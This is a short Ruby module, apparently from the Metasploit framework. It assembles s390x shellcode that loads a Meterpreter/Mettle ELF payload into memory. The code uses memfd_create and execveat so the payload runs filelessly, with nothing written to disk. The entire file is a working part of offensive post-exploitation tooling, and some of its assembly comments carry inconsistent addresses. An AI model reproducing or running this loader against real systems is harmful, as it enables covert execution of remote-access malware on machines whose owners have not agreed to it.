#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Martin Sutovsky <martin_sutovsky[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
#
# s390 conventions 
# Program counter: r0
# Syscall number: r1
# Return value: r2
# Stack Pointer: r15
# Return address: r14
# Parameters: r2-r6
# Pointer to parameter 5: r7

module Msf::Payload::Linux::Zarch::MeterpreterLoader
  def in_memory_load(payload)
    in_memory_loader = [

        # save address of current instruction into r8
        0x17770d80, #0x1000:    basr    %r8, %r0    0x0d80

        # fd = memfd_create(NULL,MFD_CLOEXEC) 
        0xa7380001, #0x1002:    lhi %r3, 1  0xa7380001
        0x9200f000, #0x1006:    mvi 0(%r15), 0  0x9200f000
        0x4120f000, #0x100a:    la  %r2, 0(%r15)    0x4120f000
        0xa719015e, #0x100e:    lghi    %r1, 0x15e  0xa719015e
        0x17770a00, #0x1012:    svc 0   0x0a00
        
        # write(fd, payload length, payload pointer)
        0x17771862, #0x1014:    lr  %r6, %r2    0x1862
        0x17771744, #0x1016:    xr  %r4, %r4    0x1744
        0xb9040048, #0x1000:	lgr	%r4, %r8	0xb9040048
        0xa7580068, #0x1000:	lhi	%r5, 0x68	0xa7580068
        0x17771a45, #0x101e:    ar  %r4, %r5    0x1a45
        0x58404000, #0x1020:    l   %r4, 0(%r4) 0x58404000
        0x17771733, #0x1024:    xr  %r3, %r3    0x1733
        0xb9040038, #0x1000:	lgr	%r3, %r8	0xb9040038
        0xa758006c, #0x1004:	lhi	%r5, 0x6c	0xa758006c
        0x17771a35, #0x102c:    ar  %r3, %r5    0x1a35
        0x17770a04, #0x102e:    svc 4   0x0a04
        
        # execveat(fd, null,null,null, AT_EMPTY_PATH)
        0x17771826, #0x1000:    lr  %r2, %r6    0x1826
        0x9200f000, #0x1002:    mvi 0(%r15), 0  0x9200f000
        0x4130f000, #0x1006:    la  %r3, 0(%r15)    0x4130f000
        0xa7480000, #0x100a:    lhi %r4, 0  0xa7480000
        0xa7580000, #0x100e:    lhi %r5, 0  0xa7580000
        0xa7681000, #0x1000:	lhi	%r6, 0x1000	0xa7681000
        0xa7190162, #0x101e:    lghi    %r1, 0x162  0xa7190162
        0x17770a00, #0x1012:    svc 0   0x0a0
        payload.length
    ].pack('N*')
    in_memory_loader
  end
end
